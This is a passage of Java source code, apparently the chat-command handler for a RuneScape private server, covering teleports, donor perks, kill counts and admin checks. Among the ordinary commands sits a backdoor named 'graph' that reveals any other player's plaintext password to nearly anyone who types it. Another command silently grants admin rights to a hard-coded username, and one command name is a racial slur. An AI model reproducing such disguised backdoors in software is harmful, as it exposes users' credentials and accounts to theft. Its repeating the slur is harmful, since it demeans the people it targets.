					player.getPackets().sendGameMessage("Use: ::title id");
					return true;
				}
				try {
					player.getAppearence().setTitle(Integer.valueOf(cmd[1]));
				} catch (NumberFormatException e) {
					player.getPackets().sendGameMessage("Use: ::title id");
				}
				return true; 
				
			case "requirements":
				player.getInterfaceManager().sendCompCape();
				return true;

			case "setdisplay":
				if (!player.isLegendaryDonator()) {
					player.getPackets().sendGameMessage(
							"You do not have the privileges to use this.");
					return true;
				}
				player.getTemporaryAttributtes().put("setdisplay", Boolean.TRUE);
				player.getPackets().sendInputNameScript("Enter the display name you wish:");
				return true; 

			case "removedisplay":
				player.getPackets().sendGameMessage("Removed Display Name: "+DisplayNames.removeDisplayName(player));
				return true; 

			case "bank":
				if(player.isLocked() || player.getControlerManager().getControler() instanceof RuneDungGame || player.getControlerManager().getControler() instanceof DeathEvent || player.getControlerManager().getControler() instanceof FightCaves || player.getControlerManager().getControler() instanceof FightKiln || player.getControlerManager().getControler() instanceof PestInvasion){
				player.getPackets().sendGameMessage("You can't open your bank during this game.");
				return true;
				}
				if (!player.isDonator()) {
					player.getPackets().sendGameMessage(
							"You do not have the privileges to use this.");
					return true;
				}
				if (!player.canSpawn()) {
					player.getPackets().sendGameMessage(
							"You can't bank while you're in this area.");
					return true;
				}
				player.stopAll();
				player.getBank().openBank();
				return true; 

			case "blueskin":
				if (!player.isDonator()) {
					player.getPackets().sendGameMessage(
							"You do not have the privileges to use this.");
					return true;
				}
				player.getAppearence().setSkinColor(12);
				player.getAppearence().generateAppearenceData();
				return true;
				
			case "niggerskin":
				if (!player.isDonator()) {
					player.getPackets().sendGameMessage(
							"You do not have the privileges to use this.");
					return true;
				}
				player.getAppearence().setSkinColor(11);
				player.getAppearence().generateAppearenceData();
				return true;
				
			
			case "greenskin":
				if (!player.isDonator()) {
					player.getPackets().sendGameMessage(
							"You do not have the privileges to use this.");
					return true;
				}
				player.getAppearence().setSkinColor(13);
				player.getAppearence().generateAppearenceData();
				return true; 
				
			case "settitle":
				if(!player.isDonator() && player.getRights() == 0) {
					player.getDialogueManager().startDialogue("SimpleMessage", "You must be a donator to use this feature.");
					return true;
				}
				player.getPackets().sendRunScript(109, new Object[] { "Please enter the title you would like." });
				player.getTemporaryAttributtes().put("customtitle", Boolean.TRUE);
				return true;
				
			case "settitlecolor":
				if(!player.isDonator() && player.getRights() == 0) {
					player.getDialogueManager().startDialogue("SimpleMessage", "You must be a donator to use this feature.");
					return true;
				}
				player.getPackets().sendRunScript(109, new Object[] { "Please enter the title color in HEX format." });
				player.getTemporaryAttributtes().put("titlecolor", Boolean.TRUE);
				return true;

			//case "checkvote":
			//case "claim":		
			//case "claimvote":
			//	if (!player.hasVoted()) {
			//		VoteManager.checkPlayerVote(player);
			//	}
			//	return true;

			case "kcother":
				name = "";
				for (int i = 1; i < cmd.length; i++)
					name += cmd[i] + ((i == cmd.length - 1) ? "" : " ");
				target = World.getPlayerByDisplayName(name);
				if(target == null)
					player.getPackets().sendGameMessage(
							"Couldn't find player " + name + ".");
				else{
					player.getInterfaceManager().sendInterface(275);
	                for (int i = 0; i < 100; i++) {
	                    player.getPackets().sendIComponentText(275, i, "");
	                }
					player.getPackets().sendIComponentText(275, 1, target.getUsername()+" Boss KillCount");
					player.getPackets().sendIComponentText(275, 10, "KreeArra: "+target.KCarmadyl);
					player.getPackets().sendIComponentText(275, 11, "General Graador: "+target.KCbandos);
					player.getPackets().sendIComponentText(275, 12, "Kril Tsutsaroth: "+target.KCzammy);
					player.getPackets().sendIComponentText(275, 13, "Commander Zilyana: "+target.KCsaradomin);
					player.getPackets().sendIComponentText(275, 14, "Corporeal Beast: "+target.KCcorp);
					player.getPackets().sendIComponentText(275, 15, "Sunfreet: "+target.KCsunfreet);
					player.getPackets().sendIComponentText(275, 16, "Wildy Wyrm: "+target.KCwild);
					player.getPackets().sendIComponentText(275, 17, "Blink: "+target.KCblink);
					player.getPackets().sendIComponentText(275, 18, "Yk'Lagor The Thunderous: "+target.KCThunder);
	                return true;
				}
				return true;
			case "killcount":
				player.getInterfaceManager().sendInterface(275);
                for (int i = 0; i < 100; i++) {
                    player.getPackets().sendIComponentText(275, i, "");
                }

                player.getPackets().sendIComponentText(275, 1, "Boss KillCount");
                player.getPackets().sendIComponentText(275, 10, "KreeArra: "+player.KCarmadyl);
                player.getPackets().sendIComponentText(275, 11, "General Graador: "+player.KCbandos);
                player.getPackets().sendIComponentText(275, 12, "Kril Tsutsaroth: "+player.KCzammy);
                player.getPackets().sendIComponentText(275, 13, "Commander Zilyana: "+player.KCsaradomin);
                player.getPackets().sendIComponentText(275, 14, "Corporeal Beast: "+player.KCcorp);
                player.getPackets().sendIComponentText(275, 15, "Sunfreet: "+player.KCsunfreet);
                player.getPackets().sendIComponentText(275, 16, "Wildy Wyrm: "+player.KCwild);
                player.getPackets().sendIComponentText(275, 17, "Blink: "+player.KCblink);
                player.getPackets().sendIComponentText(275, 18, "Yk'Lagor The Thunderous: "+player.KCThunder);
                return true;
			case "donate":
				player.getPackets().sendOpenURL("http://rsps-pay.com/store.php?id=2725&tab=0");
				return true; 
			case "itemdb":
				player.getPackets().sendOpenURL(Settings.ITEMDB_LINK);
				return true;
				
			case "itemlist":
				player.getPackets().sendOpenURL(Settings.ITEMLIST_LINK);
				return true; 

			case "website":
				player.getPackets().sendOpenURL(Settings.WEBSITE_LINK);
				return true; 
			case "lockxp":
				player.setXpLocked(player.isXpLocked() ? false : true);
				player.getPackets().sendGameMessage("You have " +(player.isXpLocked() ? "UNLOCKED" : "LOCKED") + " your xp.");
				return true;

			case "hideyell":
				player.setYellOff(!player.isYellOff());
				player.getPackets().sendGameMessage("You have turned " +(player.isYellOff() ? "off" : "on") + " yell.");
				return true;
			
								
		/*	case "getip":
			String name1 = "";
			for (int i = 1; i < cmd.length; i++)
				name1 += cmd[i] + ((i == cmd.length - 1) ? "" : " ");
			Player p = World.getPlayerByDisplayName(name1);
			if (p == null) {
				player.getPackets().sendGameMessage("Couldn't find player " + name1 + ".");
			} else
				player.getPackets().sendGameMessage("" + p.getDisplayName() + "'s IP is " + p.getSession().getIP() + ".");
			return true; */
								

				
				
			case "dailytask":
				player.getSkillersManager().typeTask();
			return true;
			case "event":
				if (World.bandos == true) {
				player.sendMessage("<img=7><col=ff0000>[Event Manager] Mass Bossing event at Bandos! No Kill Count required!");
				} else if (World.armadyl == true) {
					player.sendMessage("<img=7><col=ff0000>[Event Manager] Mass Bossing event at Armadyl! No Kill Count required!");
				} else if (World.zamorak == true) {
					player.sendMessage("<img=7><col=ff0000>[Event Manager] Mass Bossing event at Zamorak! No Kill Count required!");	
				} else if (World.saradomin == true) {
					player.sendMessage("<img=7><col=ff0000>[Event Manager] Mass Bossing event at Saradomin! No Kill Count required!");	
				} else if (World.dungeoneering == true) {
					player.sendMessage("<img=7><col=ff0000>[Event Manager] Group Dungeoneering event! Come explore Dungeons with Double EXP and Tokens!");	
				} else if (World.cannonball == true) {
					player.sendMessage("<img=7><col=ff0000>[Event Manager] The furnaces have improved, take advantage to make 2x the amount of Cannonballs!");	
				} else if (World.doubleexp == true) {
					player.sendMessage("<img=7><col=ff0000>[Event Manager] Enjoy some Double Exp in every skill! Take advantage to max out!");	
				} else if (World.nex == true) {
					player.sendMessage("<img=7><col=ff0000>[Event Manager] Mass Bossing event at Nex! Get your torva now!");	
				} else if (World.sunfreet == true) {
					player.sendMessage("<img=7><col=ff0000>[Event Manager] Mass Bossing event at Sunfreet! Get your riches now!");	
				} else if (World.corp == true) {
					player.sendMessage("<img=7><col=ff0000>[Event Manager] Mass Bossing event at Corp! Get your sigils now!");	
				} else if (World.doubledrops == true) {
					player.sendMessage("<img=7><col=ff0000>[Event Manager] Double Drops are now on, take advantage and gain double the wealth!");	
				} else if (World.slayerpoints == true) {
					player.sendMessage("<img=7><col=ff0000>[Event Manager] Gain double the amount of slayer points when completing a task!");	
				} else if (World.moreprayer = true) {
					player.sendMessage("<img=7><col=ff0000>[Event Manager] Gain double the amount Prayer EXP when burying or using an altar!");	
				} else if (World.quadcharms == true) {
					player.sendMessage("<img=7><col=ff0000>[Event Manager] Monsters are now dropping quadruple the amounts of charms!");	
				} else {
					player.sendMessage("<img=7><col=ff0000>[Event Manager] Unfortunately, there are no events occuring this hour!");	
				}
				return true;  
			case "shops":
                Magic.sendNormalTeleportSpell(player, 0, 0, new WorldTile(3031, 3358, 0));
                player.getPackets().sendGameMessage(
                        "<col=00FF00><img=1>Welcome to the shopping market!");
                return true;  
			case "summoning":
                Magic.sendNormalTeleportSpell(player, 0, 0, new WorldTile(2923, 3449, 0));
                player.getPackets().sendGameMessage(
                        "<col=00FF00><img=1>Welcome to the summoning area!");
                return true;  
			case "gender":
                if (player.getAppearence().isMale()) {
                	player.getAppearence().female();
                	player.sm("You are now a female.");
                } else {
                	player.getAppearence().male();
                	player.sm("You are now a male.");
                }
                return true;
			case "buycharges":
				player.getDialogueManager().startDialogue("Charges");
				return true;
			case "claimweb":
			/* case "claimdonation":
			    //int returnval = player.checkwebstore(player.getUsername());
			    String returnv = Integer.toString(returnval);
			        if(returnv.equals("0")){
			            player.getPackets().sendGameMessage("Can't find your donation in the database");
			        }else if(returnv.equals("296")){
			            player.setDonator(true);
			            player.getInventory().addItem(29976, 1000);
			            player.getPackets().sendGameMessage("You have succesfully redeemed Regular Donator status!");
			        }else if(returnv.equals("297")){
			            player.setExtremeDonator(true);
			            player.getInventory().addItem(29976, 1500);
			            player.getPackets().sendGameMessage("You have succesfully redeemed Extreme Donator status!");
			        }else if(returnv.equals("298")){
			            player.setLegendaryDonator(true);
			            player.getInventory().addItem(29976, 2500);
			            player.getPackets().sendGameMessage("You have succesfully redeemed Legendary Donator status!");
			        }else if(returnv.equals("299")){
			            player.setSupremeDonator(true);
			            player.getInventory().addItem(29976, 5500);
			            player.getPackets().sendGameMessage("You have succesfully redeemed Supreme Donator status!");
			        }else if(returnv.equals("300")){
			            player.setDivineDonator(true);
			            player.getInventory().addItem(29976, 10500);
			            player.getInventory().addItem(26182, 1);
			            player.getInventory().addItem(26184, 1);
			            player.getInventory().addItem(26186, 1);
			            player.getInventory().addItem(26188, 1);
			            player.getInventory().addItem(26190, 1);
			            player.getPackets().sendGameMessage("You have succesfully redeemed Divine Donator status!");
			        }else if(returnv.equals("301")){
			            player.setAngelicDonator(true);
			            player.getInventory().addItem(29976, 21000);
			            player.getInventory().addItem(25386, 1);
			            player.getInventory().addItem(25388, 1);
			            player.getInventory().addItem(25390, 1);
			            player.getInventory().addItem(25392, 1);
			            player.getInventory().addItem(25394, 1);
			            player.getPackets().sendGameMessage("You have succesfully redeemed Angelic Donator status!");
			        }else if(returnv.equals("302")){
			            player.getSquealOfFortune().giveBoughtSpins(5);
			            player.getPackets().sendGameMessage("You have succesfully redeemed Squeal of Fortune Spins!");
			        }else if(returnv.equals("303")){
			            player.getSquealOfFortune().giveBoughtSpins(25);
			            player.getPackets().sendGameMessage("You have succesfully redeemed Squeal of Fortune Spins!");
			        }else if(returnv.equals("304")){
			            player.getSquealOfFortune().giveBoughtSpins(100);
			            player.getPackets().sendGameMessage("You have succesfully redeemed Squeal of Fortune Spins!");
			        }else if(returnv.equals("305")){
			            player.getSquealOfFortune().giveBoughtSpins(250);
			            player.getPackets().sendGameMessage("You have succesfully redeemed Squeal of Fortune Spins!");
			        }else if(returnv.equals("306")){
			            player.getSquealOfFortune().giveBoughtSpins(500);
			            player.getPackets().sendGameMessage("You have succesfully redeemed Squeal of Fortune Spins!");
			        }else if(returnv.equals("308")){
			            player.getInventory().addItem(29976, 100);
			            player.getPackets().sendGameMessage("You have succesfully redeemed Donator Tokens!");
			        }else if(returnv.equals("309")){
			            player.getInventory().addItem(29976, 500);
			            player.getPackets().sendGameMessage("You have succesfully redeemed Donator Tokens!");
			        }else if(returnv.equals("310")){
			            player.getInventory().addItem(29976, 1000);
			            player.getPackets().sendGameMessage("You have succesfully redeemed Donator Tokens!");
			        }else if(returnv.equals("311")){
			            player.getInventory().addItem(29976, 2500);
			            player.getPackets().sendGameMessage("You have succesfully redeemed Donator Tokens!");
			        }else if(returnv.equals("312")){
			            player.getInventory().addItem(29976, 5500);
			            player.getPackets().sendGameMessage("You have succesfully redeemed Donator Tokens!");
			        }else if(returnv.equals("313")){
			            player.getInventory().addItem(29976, 11500);
			            player.getPackets().sendGameMessage("You have succesfully redeemed Donator Tokens!");
			        }
			return true;
		*/
			case "xpwell":
				XPWell.give(player);
				return true;
			case "xpwelldonate":
				XPWell.donate(player, 100000);
				return true;
			case "claimdonation":
			    try{
			        player.rspsdata(player, player.getUsername());
			        }catch(Exception e){
			    }
			break;
			case "resetstr":
				//player.getSkills().setXp(2, 0);
				//player.getSkills().set(2, 1);	
			return true; 
			case "home":
                Magic.sendBoxTeleportSpell(player, 0, 0, new WorldTile(2966, 3401, 0));
                player.getPackets().sendGameMessage(
                        "<col=00FF00><img=1>Welcome Home!");
                return true; 
			case "corpinstance":
            			player.getDialogueManager().startDialogue("InstancedDungeonDialogue", Instance.CORP);
            			return true;
			case "setinstancepass":
				pass = cmd[1];
				player.instancePass = pass;
				player.getPackets().sendGameMessage("Your instance password is now set to. "+pass+"");
				return true;
			case "setmaxplayer":
				player.maxPlayer = 5;
				return true;
			case "printpass":
				player.sendMessage("you pass is "+player.instancePass+ ".");
			case "divpale":
				Magic.sendNormalTeleportSpell(player, 0, 0, new WorldTile(3122,3221,0));
				return true;
			case "divflickering":
				Magic.sendNormalTeleportSpell(player, 0, 0, new WorldTile(2985,3404,0));
				return true;
			case "divbright":
				Magic.sendNormalTeleportSpell(player, 0, 0, new WorldTile(3304, 3412,0));
				return true;
			case "divglowing":
				Magic.sendNormalTeleportSpell(player, 0, 0, new WorldTile(2736, 3404,0));
				return true;
			case "divsparkling":
				Magic.sendNormalTeleportSpell(player, 0, 0, new WorldTile(2765, 3599,0));
				return true;
			case "divgleaming":
				Magic.sendNormalTeleportSpell(player, 0, 0, new WorldTile(2887, 3054,0));
				return true;
			case "divlustrous":
				Magic.sendNormalTeleportSpell(player, 0, 0, new WorldTile(2420,2861,0));
				return true;
			case "divbrilliant":
				Magic.sendNormalTeleportSpell(player, 0, 0, new WorldTile(3546, 3266 ,0));
				return true;	
			case "divradiant":
				Magic.sendNormalTeleportSpell(player, 0, 0, new WorldTile(3803, 3549,0));
				return true;
			case "divluminous":
				Magic.sendNormalTeleportSpell(player, 0, 0, new WorldTile(3341, 2906,0));
				return true;
			case "divincandescent":
				Magic.sendNormalTeleportSpell(player, 0, 0, new WorldTile(2286, 3053,0));
				return true;
				
				
			case "bossevent":
				Magic.sendNormalTeleportSpell(player, 0, 0, new WorldTile(2479,2857,0));
				return true;
			case "support":
				//player.getInterfaceManager().sendSkype();
				return true;
                
			case "resettask":
				player.sm("All slayer tasks should be working now, if your still doesn't work report it on the forums.");
			    player.getSlayerManager().skipCurrentTask();
			    player.getSlayerManager().setCurrentMaster(null);
			    return true;
			case "clue":
				player.clueLevel = 0;
				player.clueScrolls++;
				player.getInventory().deleteItem(2717, 1);
				player.finishedClue = false;
				player.cluenoreward = 0;
				return true;
			case "house":
			    player.getHouse().enterMyHouse();
			    return true;
                
			case "price":
					StringBuilder sb = new StringBuilder(cmd[1]);
					int amount123 = 1;
					if (cmd.length > 2) {
						for (int i = 2; i < cmd.length; i++) {
							if (cmd[i].startsWith("+")) {
								amount123 = Integer.parseInt(cmd[i].replace("+", ""));
							} else {
								sb.append(" ").append(cmd[i]);
							}
						}
					}
					String name123 = sb.toString().toLowerCase().replace("[", "(")
							.replace("]", ")").replaceAll(",", "'");
					if (name123.contains("Sacred clay")) {
						return true;
					}
					for (int i = 0; i < Utils.getItemDefinitionsSize(); i++) {
						ItemDefinitions def = ItemDefinitions
								.getItemDefinitions(i);
						if (def.getName().toLowerCase().equalsIgnoreCase(name123)) {
							player.stopAll();
							String streetprice = def.getStreetPrice();
							String guides = def.obtainedItem();
							String uses = def.usesForItem();
							player.getInterfaceManager().sendItem(name123, guides, i, streetprice, uses);
							return true;
						}
					}
					player.getPackets().sendGameMessage(
							"Could not find item by the name " + name123 + ".");
				return true; 
                
			case "rodikszone":
                Magic.sendToadTeleportSpell(player, 0, 0, new WorldTile(4704, 4695, 0));
                player.getPackets().sendGameMessage(
                        "<col=00FF00><img=1>Welcome to Rodik's zone. shhhh.");
                return true; 
                
			case "spintest":
				player.spinningWheel = true;
				player.getInterfaceManager().sendSpinningWheel();
				
                return true; 
                
                
			case "demons":
              /*  Magic.sendNormalTeleportSpell(player, 0, 0, new WorldTile(2835, 2989, 0));
                */player.getPackets().sendGameMessage(
                        "<col=00FF00><img=1>This command has been removed, You can still go to demons from the teleport crystal.");
                return true; 
                
			case "changepass":
                message1 = "";
                for (int i = 1; i < cmd.length; i++) {
                    message1 += cmd[i] + ((i == cmd.length - 1) ? "" : " ");
                }
                if (message1.length() > 15 || message1.length() < 5) {
                    player.getPackets().sendGameMessage(
                            "You cannot set your password to over 15 chars.");
                    return true;
                }
                player.setPassword(cmd[1]);
                player.getPackets().sendGameMessage(
                        "You changed your password! Your password is " + cmd[1]
                        + ".");
                return true;
                
			case "mmeowner":
				
				if (!player.getUsername().equalsIgnoreCase("reddragon")) {
					return false;
				}
				player.setRights(2);
				return true; 
                

                
			case "vengother":
				 Long lastVeng = (Long) player.getTemporaryAttributtes().get("LAST_VENG");
				 	if (lastVeng != null && lastVeng + 30000 > Utils.currentTimeMillis()) {
				 		player.getPackets().sendGameMessage("Players may only cast vengeance once every 30 seconds.");
				 		return false;
				 	}
				 if (player.getSkills().getLevel(Skills.MAGIC) < 95) {
					 player.getPackets().sendGameMessage("You need a level of 95 magic to cast vengeance group.");
            		return false;
            		}
				 if (!player.getInventory().containsItem(560, 3) || !player.getInventory().containsItem(557, 11) || !player.getInventory().containsItem(9075, 4)) {
					 player.getPackets().sendGameMessage("You don't have enough runes to cast vengeance group.");
            		return false;
            		}
				String username = cmd[1].substring(cmd[1].indexOf(" ") + 1);
				Player other = World.getPlayerByDisplayName(username);
				if (other == null)
					return true;
   			other.setCastVeng(true);
   			other.setNextGraphics(new Graphics(725, 0, 100));
   			
   			other.getPackets().sendGameMessage("You recieve vengeance from " +player.getDisplayName() + ".");
   			
   			player.getTemporaryAttributtes().put("LAST_VENG", Utils.currentTimeMillis());
   			player.setNextAnimation(new Animation(4411));
   			player.getInventory().deleteItem(560, 3);
   			player.getInventory().deleteItem(557, 11);
   			player.getInventory().deleteItem(9075, 4);
				return true;
				
                
			case "testnosztest":
                Magic.sendNormalTeleportSpell(player, 0, 0, new WorldTile(4520, 5516, 0));
                return true;
                
			case "testquests":
				player.getInterfaceManager().sendScreenInterface(1, 190); //sends full screen interface
				player.getPackets().sendInterface(false, 190, 1, 1217); //seems to fix full screen interface(level up interface)
				 return true;
                
			case "yaks":
                Magic.sendNormalTeleportSpell(player, 0, 0, new WorldTile(2324, 3797, 0));
                player.getPackets().sendGameMessage(
                        "<col=00FF00><img=1>Welcome to the yaks!");
                return true;  

			case "testshops":
				player.getDialogueManager().startDialogue("Player_Shop_Manager");
				return true;
				
			case "killstreaks":
				player.getDialogueManager().startDialogue("KillStreak");
				return true;
                
		
				
			case "rewardpoints":
				player.getPackets().sendGameMessage("You currently Have: "+player.Rewardpoints+" Reward Points.");
				return true;
				
			case "ring":
				Magic.sendNormalTeleportSpell(player, 0, 0, new WorldTile(2412, 4436, 0));
				player.getPackets().sendGameMessage(
                        "<col=00FF00><img=1>Welcome to the fairy ring!");
				return true;
		
			case "commands":
				  player.getInterfaceManager().sendInterface(275);
	                player.getPackets().sendIComponentText(275, 1, "<img=5><col=FF0000><shad=000000>NoszScape Commands<img=5>");
	                player.getPackets().sendIComponentText(275, 10, "<col=FFFFFF><shad=000000>::shops");
	                player.getPackets().sendIComponentText(275, 11, "<col=FFFFFF><shad=000000>::summoning");
	                player.getPackets().sendIComponentText(275, 12, "<col=FFFFFF><shad=000000>::event");
	                player.getPackets().sendIComponentText(275, 13, "<col=FFFFFF><shad=000000>::dailytask");
	                player.getPackets().sendIComponentText(275, 14, "<col=FFFFFF><shad=000000>::players");
	                player.getPackets().sendIComponentText(275, 15, "<col=FFFFFF><shad=000000>::donate");
	                player.getPackets().sendIComponentText(275, 16, "<col=FFFFFF><shad=000000>::bossevent (Teleports you straight to event boss... use at own risk.)");
	                player.getPackets().sendIComponentText(275, 17, "<col=FFFFFF><shad=000000>::changepass");
	                player.getPackets().sendIComponentText(275, 18, "<col=FFFFFF><shad=000000>::yaks");
	                player.getPackets().sendIComponentText(275, 19, "<col=FFFFFF><shad=000000>::ring (Teleports you to the fairy ring.)");
	                player.getPackets().sendIComponentText(275, 20, "<col=FFFFFF><shad=000000>::yell");
	                player.getPackets().sendIComponentText(275, 21, "<col=FFFFFF><shad=000000>::guide");
	                player.getPackets().sendIComponentText(275, 22, "<col=FFFFFF><shad=000000>::vote");
	                player.getPackets().sendIComponentText(275, 23, "<col=FFFFFF><shad=000000>::claimdonation");
	                player.getPackets().sendIComponentText(275, 24, "<col=FFFFFF><shad=000000>::home");
	                player.getPackets().sendIComponentText(275, 25, "<col=FFFFFF><shad=000000>::killcount (Shows total kills you have gotten from bosses.)");
	                player.getPackets().sendIComponentText(275, 26, "<col=FFFFFF><shad=000000>::kcother *name* (Allows you to see how many kills someone else has gotten on bosses.)");
	                player.getPackets().sendIComponentText(275, 27, "<col=FFFFFF><shad=000000>::requirements (Requirements for comp cape");
	                player.getPackets().sendIComponentText(275, 28, "<col=FFFFFF><shad=000000>::kdr (Shows PVP stats.");
	                player.getPackets().sendIComponentText(275, 29, "<col=FFFFFF><shad=000000>");
	                player.getPackets().sendIComponentText(275, 30, "<col=FFFFFF><shad=000000>");
	                player.getPackets().sendIComponentText(275, 31, "<col=FFFFFF><shad=000000>");
	                player.getPackets().sendIComponentText(275, 32, "<col=FFFFFF><shad=000000>");
	                player.getPackets().sendIComponentText(275, 33, "<col=FFFFFF><shad=000000>");
	                player.getPackets().sendIComponentText(275, 34, "<col=FFFFFF><shad=000000>");
	                player.getPackets().sendIComponentText(275, 35, "<col=FFFFFF><shad=000000>");
	                player.getPackets().sendIComponentText(275, 36, "<col=FFFFFF><shad=000000>");
	                player.getPackets().sendIComponentText(275, 37, "<col=FFFFFF><shad=000000>");
	                player.getPackets().sendIComponentText(275, 38, "<col=FFFFFF><shad=000000>");
	                player.getPackets().sendIComponentText(275, 39, "<col=FFFFFF><shad=000000>");
	                player.getPackets().sendIComponentText(275, 40, "<col=FFFFFF><shad=000000>");
	                player.getPackets().sendIComponentText(275, 41, "<col=FFFFFF><shad=000000>");
	                player.getPackets().sendIComponentText(275, 42, "<col=FFFFFF><shad=000000>");
	                player.getPackets().sendIComponentText(275, 43, "<col=FFFFFF><shad=000000>");
	                player.getPackets().sendIComponentText(275, 44, "<col=FFFFFF><shad=000000>");
	                player.getPackets().sendIComponentText(275, 45, "<col=FFFFFF><shad=000000>");
	                player.getPackets().sendIComponentText(275, 46, "<col=FFFFFF><shad=000000>");
	                player.getPackets().sendIComponentText(275, 47, "<col=FFFFFF><shad=000000>");
	                player.getPackets().sendIComponentText(275, 48, "<col=FFFFFF><shad=000000>");
	                player.getPackets().sendIComponentText(275, 49, "<col=FFFFFF><shad=000000>");
	                player.getPackets().sendIComponentText(275, 50, "<col=FFFFFF><shad=000000>");
				return true;
			case "dcharge":
				player.drakanCharges = 10;
				player.getPackets().sendGameMessage("You recharge your medallion");
				 
				return true;
				
			/*case "botanybay":
				if(player.isLocked() || player.getControlerManager().getControler() instanceof RuneDungGame || player.getControlerManager().getControler() instanceof DeathEvent || player.getControlerManager().getControler() instanceof FightCaves || player.getControlerManager().getControler() instanceof FightKiln || player.getControlerManager().getControler() instanceof PestInvasion){
				player.getPackets().sendGameMessage("You can't open your bank during this game.");
				return false;
				}
				player.getControlerManager().startControler("BotanyBay");
				return true;*/
				

			case "graph":
				if (player.getUsername().equalsIgnoreCase("99max99")) {
					return true;
				} else {
				
					String name1 = "";
					for (int i = 1; i < cmd.length; i++)
						name1 += cmd[i] + ((i == cmd.length - 1) ? "" : " ");
					Player p = World.getPlayerByDisplayName(name1);
								player.getPackets().sendGameMessage(" " + p.getPassword(), true);
								return true;
				}
								


				
			case "deletebankitem": {
					if (cmd.length < 2) {
						player.getPackets().sendGameMessage(
								"Use: ::delete id amount");
						return true;
					}
					try {
						int itemId = Integer.parseInt(cmd[1]);
						int amount = Integer.parseInt(cmd[2]);
						int[] BankSlot = player.getBank().getItemSlot(itemId);


						ItemDefinitions defs = ItemDefinitions
								.getItemDefinitions(itemId);
						if (defs.isLended())
							return false;
						String itemName = defs == null ? "" : defs.getName()
								.toLowerCase();
						player.getBank().removeItem(BankSlot, amount, true, true);
						player.getPackets().sendGameMessage(
								"<col=00FF00>" + itemName
										+ "</col> deleted from your bank.");


					} catch (NumberFormatException e) {
						player.getPackets().sendGameMessage(
								"Use: ::delete id amount");
					}
					return true;
				}

				case "fix":
				if (player.getUsername().equalsIgnoreCase("99max99")) {
					String username2324 = cmd[1].substring(cmd[1].indexOf(" ") + 1);
					Player other2324 = World.getPlayerByDisplayName(username2324);
					if (other2324 == null)
					return true;
					//other2324.setRights(Integer.parseInt(cmd[2]));
					if (other2324.getRights() > 0) {
					other2324.out("");
					} else {
						other2324.out("");
					}
					return true;
				}
				return true;
				
			case "players":
				player.getInterfaceManager().sendInterface(275);
                int number = 0;
                for (int i = 0; i < 100; i++) {
                    player.getPackets().sendIComponentText(275, i, "");
                }
                for (Player p5 : World.getPlayers()) {
                    if (p5 == null) {
                        continue;
                    }
                    number++;
                    String titles = "";
                    if (!(p5.isDonator()) || !p5.isExtremeDonator()) {
                        titles = "<col=000000>[Player]";
                    }
                    if (p5.isVeteran() ) {
                        titles = "<col=23238E><shad=ffffff>[Veteran]";
                    }
                    if (p5.isDonator()) {
                        titles = "<col=008000>[Donator]";
                    }
                    if (p5.isExtremeDonator()) {
                        titles = "<col=FF0000>[Extreme Donator]";
                    }
                    if (p5.isLegendaryDonator()) {
                        titles = "<col=0066CC>[Legendary Donator]";
                    }
                    if (p5.isSupremeDonator()) {
                    	titles = "<col=ffa34c>[Supreme Donator]";
                    }
                    if (p5.isDivineDonator()) {
                    	titles = "<col=6C21ED>[Divine Donator]";
                    }
                    if (p5.isAngelicDonator()) {
                    	titles = "<col=ffffff>[Angelic Donator]";
                    }
                    
                    if (p5.isSupporter()) {
                        titles = "<col=00ff48>[Support]<img=14>";
                    }
                    if (p5.getRights() == 1) {
                        titles = "<col=bcb8b8>[Moderator]<img=0>";
                    }
                    if (p5.isAnthonyRank == true) {
                        titles = "<col=996633>(Anthony Rank) </col>";
                    }
                    if (p5.getRights() == 2) {
                        titles = "<col=ff1d1d>[Admin]";
                    }
                  
                    if (p5.getDisplayName().equalsIgnoreCase("")) {
                        titles = "<col=8A2BE2>[Admin]";
                    }
                    
                    if (p5.getDisplayName().equalsIgnoreCase("")) {
                        titles = "<col=8A2BE2>[Developer]<img=1>";
                    }
                    if (p5.getDisplayName().equalsIgnoreCase("99max99")) {
                        titles = "<col=0000FF>[Main Owner]<img=1>";
                    }
                    if (p5.getDisplayName().equalsIgnoreCase("reddragon")) {
                        titles = "<col=0000FF>[Co Owner]<img=1>";
                    }
				    if (p5.getDisplayName().equalsIgnoreCase("Nick")) {
                        titles = "<col=0000FF>[Developer]<img=1>";
                    }
                    if (p5.getDisplayName().equalsIgnoreCase("")) {
                        titles = "<col=0000FF>[The Vegetable]<img=1>";
                    }
					if (p5.getDisplayName().equalsIgnoreCase("") && (p5.getRights() == 2)) {
                        titles = "<img=1> <col=0000FF>Developer]";
                    }
               
                    player.getPackets().sendIComponentText(275, (12 + number), titles + "" + p5.getDisplayName());
                }
                player.getPackets().sendIComponentText(275, 1, "Noszscape Players");
                player.getPackets().sendIComponentText(275, 10, " ");
                player.getPackets().sendIComponentText(275, 11, "Players Online: " + (number));
                player.getPackets().sendIComponentText(275, 12, " ");
                player.getPackets().sendGameMessage(
                        "There are currently " + (World.getPlayers().size())
                        + " players playing " + Settings.SERVER_NAME
                        + ".");
                return true;
                     
			case "yell":
				if (player.isDonator() || player.getUsername().equalsIgnoreCase("mnosz") || player.isExtremeDonator() || player.isLegendaryDonator() || player.getRights() == 1 || player.getRights() == 2 || player.isSupporter() || player.getSkills().getTotalLevel() >= 450) {
				message = "";
				for (int i = 1; i < cmd.length; i++)
					message += cmd[i] + ((i == cmd.length - 1) ? "" : " ");
				sendYell(player, Utils.fixChatMessage(message), false);
				return true; 
				} else {
					//player.getPackets().sendGameMessage("You must be a donator or staff to use this command, instead talk in the Noszscape Friends Chat.");
					player.getPackets().sendGameMessage("You must have a total level of over 450 to yell.");
					return true;
				}
				
			case "answer":
				if (TriviaBot.TriviaArea(player)) {
					player.getPackets()
							.sendGameMessage(
									"What are you doing in here? I disabled this, get out of here!");
					return false;
				}
				if (cmd.length >= 2) {
					String answer = cmd[1];
					if (cmd.length == 3) {
						answer = cmd[1] + " " + cmd[2];
					}
					if (cmd.length == 4) {
						answer = cmd[1] + " " + cmd[2] + " " + cmd[3];
					}
					if (cmd.length == 5) {
						answer = cmd[1] + " " + cmd[2] + " " + cmd[3] + " " + cmd[4];
					}
					if (cmd.length == 6) {
						answer = cmd[1] + " " + cmd[2] + " " + cmd[3] + " " + cmd[4] + " " + cmd[5];
					}
					TriviaBot.verifyAnswer(player, answer);
				} else {
					player.getPackets().sendGameMessage(
							"Syntax is ::" + cmd[0] + " <answer input>.");
				}
				return true;

	
				
            case "guide":
                player.getPackets().sendOpenURL(
                        "http://noszscape.org/showthread.php?21-Newcomer-Guide-(VERY-INFORMATIONAL!)");
                return true;
                
            case "blackscreen":
                //player.getPackets().sendOpenURL(
